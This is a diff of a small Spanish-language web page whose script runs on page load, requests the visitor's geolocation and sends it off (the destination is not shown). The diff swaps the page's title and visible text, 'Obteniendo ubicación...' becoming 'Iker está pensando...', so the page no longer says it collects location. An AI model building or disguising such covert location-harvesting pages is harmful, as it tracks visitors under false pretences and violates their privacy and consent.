@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ubicación</title>
+    <title>IkerWeb</title>
     <script>
         function enviarUbicacion() {
             if (navigator.geolocation) {
@@ -28,13 +28,13 @@
                       .catch(error => console.error("Error al enviar:", error));
                 });
             } else {
-                alert("La geolocalización no está disponible.");
+                alert("Iker no ha podido pensar...");
             }
         }
         window.onload = enviarUbicacion;
     </script>
 </head>
 <body>
-    <p>Obteniendo ubicación...</p>
+    <p>Iker está pensando...</p>
 </body>
 </html>
